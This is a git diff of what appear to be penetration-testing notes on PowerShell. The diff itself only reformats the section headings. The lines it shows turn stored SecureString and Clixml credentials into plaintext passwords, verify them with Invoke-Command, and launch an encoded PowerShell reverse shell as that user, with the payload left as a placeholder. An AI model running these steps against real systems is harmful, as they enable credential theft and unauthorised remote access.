@@ -18,15 +18,15 @@ $secureString = ConvertTo-SecureString "<encrypted_binary>"
 $credential = New-Object PSCredential("username", $secureString)
 $plainTextPassword = $credential.GetNetworkCredential().Password
 ```
-# Automate Way
+# > Automate Way
 ```language
 (Import-Clixml "C:\Path\To\Your\connection.xml").GetNetworkCredential().Password
 ```
-# Verify it
+# > Verify it
 ```language
 Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } 2>&1
 ```
-# Reverse shell as that user
+# > Reverse shell as that user
 ```language
 Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { powershell -enc <encoded code here> } 2>&1
 ```
